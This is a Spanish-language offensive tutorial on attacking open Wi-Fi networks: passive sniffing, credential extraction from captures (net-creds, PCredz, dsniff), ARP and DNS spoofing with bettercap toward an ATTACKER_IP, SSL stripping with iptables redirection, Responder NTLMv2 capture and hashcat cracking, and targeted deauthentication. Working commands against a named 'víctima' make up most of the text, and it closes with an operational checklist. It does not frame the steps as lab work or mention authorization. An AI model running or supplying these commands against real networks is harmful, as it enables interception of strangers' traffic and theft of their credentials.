# Ataques en Redes Abiertas y MITM Wi-Fi

### Redes abiertas como superficie de ataque

Las redes Wi-Fi abiertas (sin contraseña) son las más vulnerables porque todo el tráfico HTTP viaja en texto claro y es capturable por cualquier persona en el mismo canal. Se encuentran en cafeterías, hoteles, aeropuertos, bibliotecas y espacios públicos.

```
Red abierta:
[Cliente] ──────────────────────────→ [AP] → Internet
          tráfico HTTP en texto claro
          ↑
    Cualquiera con una tarjeta Wi-Fi
    en modo monitor puede capturar esto
```

### Sniffing pasivo en redes abiertas

#### Captura básica con airodump-ng

```bash
# Identificar el canal de la red objetivo
airodump-ng wlan0mon
# Anotar el canal de la red abierta objetivo

# Focalizar la captura en ese canal
airodump-ng wlan0mon --channel 6 -w captura_abierta

# O capturar todo el canal sin filtrar por BSSID
# (útil para ver todo el tráfico del canal)
```

#### Captura directa con tcpdump

```bash
# Poner la interfaz en el canal correcto
iwconfig wlan0mon channel 6

# Capturar todo el tráfico del canal
tcpdump -i wlan0mon -w captura.pcap

# Solo HTTP (puerto 80)
tcpdump -i wlan0mon -w http_traffic.pcap port 80

# Solo protocolos con credenciales en claro
tcpdump -i wlan0mon -w credenciales.pcap \
    'port 21 or port 23 or port 25 or port 110 or port 143 or port 80'

# Captura en tiempo real con output ASCII
tcpdump -i wlan0mon -A port 80 | grep -E "GET|POST|password|user|login|auth"
```

### Análisis de capturas

#### Wireshark — Análisis visual

```bash
# Abrir la captura
wireshark captura.pcap

# Filtros esenciales para extraer credenciales:

# HTTP POST (formularios de login)
http.request.method == "POST"

# Credenciales HTTP en claro
http contains "password"
http contains "passwd"
http contains "pass="
http contains "pwd="

# HTTP Basic Auth
http.authheader

# FTP login
ftp.request.command == "USER" || ftp.request.command == "PASS"

# Telnet (todo en claro)
telnet

# POP3 emails
pop

# SMTP
smtp

# Seguir el stream TCP completo de una conexión interesante:
# Clic derecho en paquete → Follow → TCP Stream
# → Ver toda la conversación incluyendo credenciales

# Extraer archivos transferidos via HTTP:
# File → Export Objects → HTTP
# → Descarga todas las imágenes, archivos, etc. capturados
```

#### net-creds — Extracción automática de credenciales

```bash
# Instalación
git clone https://github.com/DanMcInerney/net-creds.git
pip3 install -r requirements.txt

# Desde archivo pcap
python3 net-creds.py -p captura.pcap

# En tiempo real desde la interfaz
python3 net-creds.py -i wlan0mon

# Extrae automáticamente credenciales de:
# → HTTP (GET/POST con parámetros de login)
# → FTP (usuario y contraseña)
# → IRC (nick y contraseña)
# → POP3 (usuario y contraseña)
# → IMAP (usuario y contraseña)
# → Telnet (sesión completa)
# → SMTP AUTH
# → HTTP Basic Auth
# → MSN / AIM
# → NTLMv1/v2
```

#### PCredz — Extracción avanzada

```bash
# Instalación
git clone https://github.com/lgandx/PCredz.git
pip3 install Scapy python-ldap

# Desde pcap
python3 Pcredz -f captura.pcap -v

# En tiempo real
python3 Pcredz -i wlan0mon -v

# Extrae además:
# → Hashes NTLMv1/v2 (para crackear offline)
# → Credenciales de protocolos de bases de datos
# → Hashes de autenticación Kerberos
# → Tokens de sesión
```

### ARP Spoofing — MITM en red Wi-Fi

Una vez conectado a la misma red que la víctima, el ARP Spoofing permite interceptar TODO su tráfico, incluyendo HTTPS (con SSL stripping).

```
Sin ARP Spoofing:
[Víctima] ────────────────────→ [Router] → Internet

Con ARP Spoofing:
[Víctima] → [Atacante] → [Router] → Internet
           ↑ Todo el tráfico pasa por el atacante
```

#### Preparación

```bash
# Habilitar IP forwarding (imprescindible para que la víctima tenga internet)
echo 1 > /proc/sys/net/ipv4/ip_forward
# Permanente:
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
sysctl -p

# Verificar que estás en la misma red que la víctima
ip a   # Tu IP
arp -a # Tabla ARP actual
```

#### ARP Spoofing con arpspoof

```bash
# Terminal 1: envenenar la tabla ARP de la víctima
# (diciéndole que la IP del router es nuestra MAC)
arpspoof -i wlan0 -t VICTIMA_IP GATEWAY_IP

# Terminal 2: envenenar la tabla ARP del router
# (diciéndole que la IP de la víctima es nuestra MAC)
arpspoof -i wlan0 -t GATEWAY_IP VICTIMA_IP

# Ambas terminales deben estar activas simultáneamente
# para MITM bidireccional

# Capturar el tráfico interceptado
tcpdump -i wlan0 -w mitm_captura.pcap host VICTIMA_IP
```

#### MITM con Bettercap (más moderno y completo)

```bash
# Iniciar bettercap en la interfaz conectada a la red
bettercap -iface wlan0

# En la consola interactiva de bettercap:

# Ver dispositivos en la red
net.probe on
net.show

# ARP spoofing contra todos los dispositivos
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# O solo contra una víctima específica
set arp.spoof.targets 192.168.1.5
arp.spoof on

# Sniffing del tráfico interceptado
net.sniff on
# Muestra credenciales en tiempo real en la consola

# Capturar a archivo pcap
set net.sniff.output captura_mitm.pcap
net.sniff on

# DNS spoofing (redirigir dominios específicos)
set dns.spoof.domains google.com,facebook.com
set dns.spoof.address ATTACKER_IP    # Nuestra IP donde tenemos el server falso
dns.spoof on

# HTTP proxy para modificar tráfico en tiempo real
http.proxy on

# Verificar el estado de los módulos
modules
```

#### SSL Stripping — Downgrade HTTPS → HTTP

```bash
# Bettercap puede hacer SSL stripping automáticamente
bettercap -iface wlan0 -eval "set arp.spoof.targets VICTIMA_IP; arp.spoof on; \
    set https.proxy.sslstrip true; https.proxy on; net.sniff on"

# Con sslstrip2 + bettercap:
set https.proxy.sslstrip true
https.proxy on

# Con mitmproxy (más control):
mitmproxy --mode transparent --showhost \
    --ssl-insecure -p 8080

# Configurar iptables para redirigir el tráfico HTTPS al proxy
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 \
    -j REDIRECT --to-port 8080

# Limitaciones de SSL Stripping:
# → HSTS (HTTP Strict Transport Security) lo previene en sitios modernos
# → Los navegadores modernos marcan el sitio como "inseguro"
# → Funciona en: apps móviles sin certificate pinning, apps antiguas, HTTP puro
```

### Captura de hashes NTLMv2 (Responder)

En redes con dispositivos Windows, Responder captura hashes de autenticación NTLM respondiendo a consultas LLMNR y NBT-NS.

```bash
# Responder en la interfaz Wi-Fi conectada
sudo responder -I wlan0 -rdwv

# Responder actúa como:
# → Servidor SMB falso
# → Servidor HTTP falso
# → Servidor FTP falso
# → Servidor SQL falso
# → Servidor LDAP falso
# → Envenenador LLMNR/NBT-NS

# Los hashes NTLMv2 capturados se guardan en:
ls /usr/share/responder/logs/

# Crackear los hashes con hashcat
hashcat -m 5600 hashes_ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

### Captura de tráfico en redes cifradas (mismo canal)

Incluso en redes WPA2 (sin ser cliente), se puede capturar tráfico cifrado y descifrarlo si se tiene la PSK.

```bash
# Capturar el tráfico de la red WPA2
airodump-ng wlan0mon --bssid BSSID_AP --channel 6 -w captura_cifrada

# Desencriptar en Wireshark con la contraseña conocida:
# Edit → Preferences → Protocols → IEEE 802.11
# → Enable decryption: YES
# → Decryption keys → Add
# → Key type: wpa-pwd
# → Key: contraseña:SSID (ej: mipassword:MiWiFi)

# O con airdecap-ng desde la terminal
airdecap-ng -e "NombreRed" -p "ContraseñaRed" captura_cifrada-01.cap
# Genera: captura_cifrada-01-dec.cap (descifrado)

# Analizar el tráfico descifrado
wireshark captura_cifrada-01-dec.cap
```

### Deauth selectivo para capturar handshakes de clientes específicos

```bash
# Si quieres capturar el tráfico de UN cliente específico:

# 1. Identificar el cliente en airodump-ng (columna STATION)
# 2. Deauth solo a ese cliente
aireplay-ng -0 3 -a BSSID_AP -c MAC_CLIENTE wlan0mon

# 3. El cliente se reconecta y genera un handshake
# 4. Descifrar su tráfico con airdecap-ng si tienes la PSK
```

### Herramientas de análisis post-captura

```bash
# Dsniff — extracción de credenciales de pcap
dsniff -p captura.pcap

# urlsnarf — URLs visitadas
urlsnarf -p captura.pcap

# msgsnarf — mensajes de chat (IRC, AIM...)
msgsnarf -p captura.pcap

# mailsnarf — emails
mailsnarf -p captura.pcap

# filesnarf — archivos transferidos via NFS
filesnarf -p captura.pcap

# strings en el pcap (búsqueda bruta)
strings captura.pcap | grep -iE "password|passwd|pass=|pwd=|user=|login"

# tshark para extraer campos específicos
# Extraer todas las URLs visitadas
tshark -r captura.pcap -Y "http.request" \
    -T fields -e http.host -e http.request.uri

# Extraer todos los POST con parámetros
tshark -r captura.pcap -Y "http.request.method==POST" \
    -T fields -e ip.src -e http.host -e http.file_data
```

### Checklist para redes abiertas

```
□ Identificar la red abierta objetivo con airodump-ng
□ Fijar el canal: iwconfig wlan0mon channel N
□ Iniciar captura: tcpdump -i wlan0mon -w captura.pcap
□ Analizar con Wireshark: filtro http.request.method == POST
□ Ejecutar net-creds para extracción automática
□ Si se está conectado a la misma red:
  □ IP forwarding habilitado
  □ ARP spoofing con bettercap o arpspoof
  □ net.sniff on en bettercap para ver credenciales en tiempo real
  □ Responder para hashes NTLMv2 si hay Windows
□ Analizar pcap completo con dsniff, urlsnarf, filesnarf
```

> Bettercap unifica en un solo framework el ARP spoofing, SSL stripping, DNS spoofing y captura de credenciales. Es la herramienta más completa para MITM en redes Wi-Fi y reemplaza a las herramientas individuales (arpspoof, sslstrip, dnsspoof) con una interfaz interactiva.

> En redes corporativas con dispositivos Windows, Responder captura hashes NTLMv2 de forma pasiva respondiendo a resoluciones LLMNR fallidas — sin necesidad de atacar directamente ningún dispositivo. Muy sigiloso y efectivo.

> El SSL stripping es cada vez menos efectivo en sitios modernos porque HSTS hace que el navegador rechace la conexión HTTP incluso si el servidor la ofrece. Sigue funcionando en apps móviles sin certificate pinning, servicios internos, y sitios que no tienen HSTS configurado.
